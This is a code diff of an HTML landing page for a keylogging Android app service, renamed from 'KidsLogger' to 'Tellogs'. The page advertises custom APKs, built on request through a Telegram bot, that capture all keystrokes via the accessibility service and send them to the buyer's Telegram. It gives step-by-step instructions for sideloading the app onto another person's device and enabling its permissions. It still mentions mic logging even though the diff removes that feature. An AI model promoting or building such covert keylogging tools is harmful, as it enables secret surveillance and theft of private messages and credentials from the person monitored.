@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>KidsLogger - Monitor Safely</title>
+  <title>Tellogs - Monitor Safely</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/alpinejs" defer></script>
 </head>
@@ -12,7 +12,7 @@
   <!-- Navbar -->
   <header class="bg-white shadow fixed top-0 w-full z-50">
     <div class="container mx-auto px-6 py-4 flex justify-between items-center">
-      <h1 class="text-2xl font-bold text-purple-600">KidsLogger</h1>
+      <h1 class="text-2xl font-bold text-purple-600">Tellogs</h1>
       <nav class="space-x-4 hidden md:block">
         <a href="#features" class="hover:text-purple-600">Features</a>
         <a href="#install" class="hover:text-purple-600">How to Install</a>
@@ -26,8 +26,8 @@
   <section class="bg-purple-700 text-white pt-24 pb-20 text-center">
     <div class="container mx-auto px-6">
       <h2 class="text-4xl md:text-5xl font-bold mb-4">Monitor Your Kids' Device Safely</h2>
-      <p class="text-lg max-w-2xl mx-auto mb-6">KidsLogger generates a custom APK that captures keystrokes and mic/call access using accessibility service. Logs are sent directly to your Telegram.</p>
-      <a href="https://t.me/your_bot" class="bg-white text-purple-700 px-6 py-3 font-semibold rounded hover:bg-gray-200">Request APK</a>
+      <p class="text-lg max-w-2xl mx-auto mb-6">Tellogs generates a custom APK that captures keystrokes using accessibility service. Logs are sent directly to your Telegram.</p>
+      <a href="https://t.me/kidslog_bot" class="bg-white text-purple-700 px-6 py-3 font-semibold rounded hover:bg-gray-200">Request APK</a>
     </div>
   </section>
 
@@ -41,10 +41,6 @@
           <p>Captures all typed characters using accessibility permission.</p>
         </div>
         <div class="bg-gray-50 p-6 rounded shadow">
-          <h4 class="text-xl font-semibold mb-2">Mic & Call Monitor</h4>
-          <p>Detects mic access and call events dynamically—no root required.</p>
-        </div>
-        <div class="bg-gray-50 p-6 rounded shadow">
           <h4 class="text-xl font-semibold mb-2">Telegram Bot Alerts</h4>
           <p>Data is instantly pushed to your Telegram bot for real-time visibility.</p>
         </div>
@@ -55,19 +51,19 @@
   <!-- Install Guide -->
   <section id="install" class="py-16 bg-gray-100">
     <div class="container mx-auto px-6">
-      <h3 class="text-3xl font-bold text-center mb-8">How to Install</h3>
+      <h3 class="text-3xl font-bold text-center mb-8">How to Install on Child's Device</h3>
       <div class="max-w-4xl mx-auto space-y-6 text-lg">
         <div>
-          <strong>Step 1:</strong> Pay ₹300 using UPI (PhonePe or GPay) via the form below.
+          <strong>Step 1:</strong> Click “Request APK” to start the Telegram bot and get your custom app.
         </div>
         <div>
-          <strong>Step 2:</strong> After successful payment, click “Request APK” to chat with our Telegram bot.
+          <strong>Step 2:</strong> Install the generated APK on your child's device. You may need to allow installation from unknown sources.
         </div>
         <div>
-          <strong>Step 3:</strong> The bot triggers a GitHub workflow that builds a custom KidsLogger APK for you.
+          <strong>Step 3:</strong> Open the app once, and follow the prompt to enable <strong>Accessibility Permissions</strong>.
         </div>
         <div>
-          <strong>Step 4:</strong> Install the APK, enable Accessibility permission, and you're good to go!
+          <strong>Step 4:</strong> Once permissions are granted, the app starts logging keystrokes and mic access in the background and sends logs to your Telegram.
         </div>
       </div>
     </div>
@@ -86,9 +82,9 @@
         </ul>
         <ul class="space-y-3">
           <li>✅ Accessibility Service (for keystrokes & mic detection)</li>
-          <li>✅ UPI Payment via PhonePe Gateway</li>
-          <li>✅ Webhooks to verify payment before APK generation</li>
-          <li>✅ Telegram logs for monitoring</li>
+          <li>✅ Real-time log delivery via Telegram</li>
+          <li>✅ No root required</li>
+          <li>✅ Fully automated APK generation</li>
         </ul>
       </div>
     </div>
@@ -105,8 +101,9 @@
 
   <!-- Footer -->
   <footer class="bg-white py-6 text-center text-gray-500 text-sm">
-    &copy; 2025 KidsLogger.
+    &copy; 2025 Tellogs.
   </footer>
 
 </body>
 </html>
+
